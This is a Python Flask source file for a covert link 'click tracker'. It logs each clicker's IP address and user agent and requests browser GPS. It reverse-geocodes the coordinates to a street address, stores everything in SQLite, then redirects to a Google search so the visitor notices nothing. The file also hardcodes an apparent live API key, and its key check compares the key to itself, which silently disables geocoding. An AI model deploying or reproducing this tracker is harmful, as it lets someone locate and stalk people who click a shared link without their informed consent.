# app.py

from flask import Flask, request, redirect, render_template_string, render_template
from ip_locator import get_location_from_ip 
from opencage.geocoder import OpenCageGeocode # NEW: OpenCage Import
import datetime
import sqlite3 
import os 

app = Flask(__name__)

# --- Configuration ---
FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
DATABASE_FILE = 'click_tracker.db'

# ⚠️ PASTE YOUR OPEN CAGE KEY HERE 
OPENCAGE_API_KEY = "57846fc1e1014975b603db1c658fcf50" # REPLACE WITH YOUR ACTUAL KEY
# Initialize the OpenCage client
if OPENCAGE_API_KEY != "57846fc1e1014975b603db1c658fcf50":
    geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
else:
    geocoder = None


# --- Database Setup (Standard) ---
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            source TEXT, 
            user_agent TEXT
        )
    """)
    conn.commit()
    conn.close()

# --- Database Logging Function (Standard) ---
def log_click_data(ip, location, user_agent, source="IP"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = (
        timestamp,
        ip,
        location.get('country', 'N/A'),
        location.get('city', 'N/A'),
        location.get('latitude'),
        location.get('longitude'),
        source, 
        user_agent
    )

    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, user_agent) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, data)
        
        conn.commit()
        conn.close()
        print(f"--- LOGGED ({source}) --- IP: {ip} | Loc: {location.get('city', 'N/A')}, {location.get('country', 'N/A')} | Coords: {location.get('latitude')}")
        
    except sqlite3.Error as e:
        print(f"SQLite error during logging: {e}")


# --- NEW FUNCTION: Reverse Geocoding for IP/GPS ---
def get_address_from_coords(lat, lon):
    """Uses OpenCage API to convert coordinates to a readable address."""
    if not geocoder:
        return "API Key Missing"

    try:
        results = geocoder.reverse_geocode(lat, lon, limit=1)
        
        if results and results[0]['formatted']:
            return results[0]['formatted']
        else:
            return "Address Not Found"
            
    except Exception as e:
        print(f"OpenCage API Error: {e}")
        return "Geocoding API Error"


# --- 1. Main Link Click (Entry Point) ---
@app.route('/track_click')
def track_click():
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Redirect to the page that requests GPS location via JavaScript
    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")


# --- 2. Location Request Page (Serves HTML with JS) ---
@app.route('/request_location')
def request_location():
    return render_template('request_location.html', 
                           user_ip=request.args.get('ip'), 
                           user_agent=request.args.get('ua'))


# --- 3. GPS Location Received (Precise Data) ---
@app.route('/location_received')
def location_received():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    # Reverse Geocode the coordinates
    full_address = get_address_from_coords(float(lat), float(lon))
    
    location_data = {
        "country": "GPS_DATA", 
        "city": full_address, 
        "latitude": float(lat), 
        "longitude": float(lon)
    }

    log_click_data(ip, location_data, ua, source="GPS")
    print(f"--- PRECISE GPS Location and Address: {full_address}")
    
    return redirect(FINAL_DESTINATION_URL)


# --- 4. Fallback (IP Geolocation) ---
@app.route('/fallback')
def fallback():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    
    # Run IP Geolocation (returns general coordinates)
    location_data = get_location_from_ip(ip)
    
    if location_data and location_data.get('latitude') and location_data.get('longitude'):
        # If coordinates are available from the IP lookup, reverse geocode them.
        lat = location_data['latitude']
        lon = location_data['longitude']
        full_address = get_address_from_coords(lat, lon)
        
        # Update the location data with the full address
        location_data['city'] = full_address
        location_data['country'] = "IP_GEO_LOC" # Change source type for clarity
    
    elif not location_data:
        # Handle complete failure
        location_data = {"country": "Unknown", "city": "Unknown", "latitude": None, "longitude": None}

    # Log the data (either IP-derived address or "Unknown")
    log_click_data(ip, location_data, ua, source="IP_FALLBACK")
    
    return redirect(FINAL_DESTINATION_URL)


if __name__ == '__main__':
    init_db() 
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("--- Flask GPS/IP Geolocation Tracker Running ---")
    app.run(debug=True, host='127.0.0.1', port=5000)
